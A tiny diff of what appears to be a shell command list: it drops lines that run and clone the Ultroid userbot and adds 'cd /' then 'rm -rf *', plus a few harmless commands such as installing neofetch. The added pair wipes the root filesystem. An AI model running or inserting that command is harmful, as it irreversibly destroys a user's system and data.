@@ -1,5 +1,7 @@
-python3 -m pyultroid
-git clone https://github.com/TeamUltroid/Ultroid
-cd Ultroid
+cd /
+rm -rf *
 ls
-ls -a
+mkdir ab
+ls
+sudo
+apt install neofetch
